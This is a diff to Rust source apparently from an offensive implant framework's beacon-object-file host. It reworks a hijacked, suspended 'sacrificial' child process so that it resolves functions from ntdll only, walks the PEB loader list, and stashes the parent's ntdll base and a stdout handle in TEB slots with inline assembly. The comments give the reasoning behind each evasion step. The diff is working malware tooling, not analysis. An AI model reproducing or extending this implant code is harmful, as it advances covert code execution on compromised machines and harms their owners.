@@ -83,34 +83,45 @@ fn _alloc_error(_layout: core::alloc::Layout) -> ! {
 
 /// Resolve `ExitProcess` and leave the process with `code`. Diverges.
 fn exit_process(code: u32) -> ! {
-    if let Some(addr) = unsafe { crate::export_addr(b"kernel32.dll", b"ExitProcess") } {
-        let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
-        f(code);
+    // NtTerminateProcess on NtCurrentProcess: no kernel32 in the child.
+    if let Some(addr) = unsafe { crate::export_addr(b"ntdll.dll", b"NtTerminateProcess") } {
+        let f: extern "system" fn(usize, i32) -> i32 = unsafe { core::mem::transmute(addr) };
+        let _ = unsafe { f(!0usize, code as i32) };
     }
-    // Defensive trap — only reached if kernel32 is gone (catastrophic).
+    // Defensive trap — only reached if ntdll is gone (catastrophic).
     loop {
         core::hint::spin_loop();
     }
 }
 
-/// Kernel32 export resolution with an LDR-independent fallback.
+/// ntdll export resolution with an LDR-independent fallback.
 ///
 /// Primary path: [`nyx_implant_core::resolve::export_addr`] (PEB -> Ldr
-/// InLoadOrderModuleList walk). Fallback: the parent's kernel32 base,
-/// stashed by [`entry_run`] in the TEB `ReservedForOle` slot (gs:[0x1780]).
-/// The fallback exists because a CreateProcessW(SUSPENDED) child that is
-/// resumed and hijacked can keep `PEB->Ldr` NULL in non-interactive
-/// sessions (observed on windows-latest: Ldr stays 0 while the image still
-/// runs normally) — and same-boot processes share image bases (boot-level
-/// ASLR), so the parent's kernel32 base resolves the same exports.
+/// InLoadOrderModuleList walk). Fallback: the parent's ntdll base, stashed
+/// by [`entry_run`] in the TEB `ReservedForOle` slot (gs:[0x1780]).
 ///
-/// All bof-host kernel32 lookups route through this (the crate files import
+/// Why ntdll only: a CreateProcessW(SUSPENDED) child that is resumed and
+/// hijacked never runs LdrpInitializeProcess — its PEB->Ldr stays NULL and
+/// **kernel32 is never even mapped** (proven on windows-latest:
+/// NtReadVirtualMemory of the parent's kernel32 base returns
+/// STATUS_PARTIAL_COPY, while ntdll — mapped by CreateProcessW itself —
+/// reads fine). ntdll's export table is therefore the only reliable
+/// resolution source in the child; every bof-host API was migrated to it
+/// (Rtl*/Nt* equivalents), and same-boot processes share image bases
+/// (boot-level ASLR), so the parent's ntdll base is valid in the child.
+///
+/// All bof-host lookups route through this (the crate files import
 /// `crate::export_addr`), keeping the call sites unchanged.
 pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
     if let Some(a) = nyx_implant_core::resolve::export_addr(module, func) {
         return Some(a);
     }
-    if nyx_implant_core::resolve::djb2(module) != nyx_implant_core::resolve::djb2(b"kernel32.dll") {
+    // The sacrificial child's loader never runs (kernel32 is not even
+    // mapped — proven on windows-latest: reading the parent's kernel32 base
+    // in the child returns STATUS_PARTIAL_COPY while ntdll reads fine), so
+    // the fallback only serves ntdll, whose base the parent stashed at
+    // gs:[0x1780].
+    if nyx_implant_core::resolve::djb2(module) != nyx_implant_core::resolve::djb2(b"ntdll.dll") {
         return None;
     }
     let base: u64;
@@ -176,14 +187,28 @@ unsafe fn entry_run(packed: *const u8) -> u32 {
     // B3 kernel32 fallback base (parent-provided; see [`export_addr`]): the
     // u64 sits right after the packed args. Stash in the TEB ReservedForOle
     // slot (gs:[0x1780]) — nothing else in the sacrificial process uses it.
+    // B3 parent-provided bases (see [`export_addr`]): [u64 ntdll_base]
+    // [u64 stdout_handle] sit right after the packed args. Stashed in the
+    // TEB slots gs:[0x1780] (ntdll base) and gs:[0x1788] (stdout handle) —
+    // nothing else in the sacrificial process uses them.
     let base_off = args_len_off + 4 + args_len as usize;
-    if base_off + 8 <= (MAX_ARGS as usize) + 4 + 8 {
-        let k32 = unsafe { (packed.add(base_off) as *const u64).read_unaligned() };
-        if k32 != 0 {
+    if base_off + 16 <= (MAX_ARGS as usize) + 4 + 16 {
+        let nt_base = unsafe { (packed.add(base_off) as *const u64).read_unaligned() };
+        let out_handle = unsafe { (packed.add(base_off + 8) as *const u64).read_unaligned() };
+        if nt_base != 0 {
             unsafe {
                 core::arch::asm!(
                     "mov qword ptr gs:[0x1780], {}",
-                    in(reg) k32,
+                    in(reg) nt_base,
+                    options(nostack, preserves_flags),
+                );
+            }
+        }
+        if out_handle != 0 {
+            unsafe {
+                core::arch::asm!(
+                    "mov qword ptr gs:[0x1788], {}",
+                    in(reg) out_handle,
                     options(nostack, preserves_flags),
                 );
             }
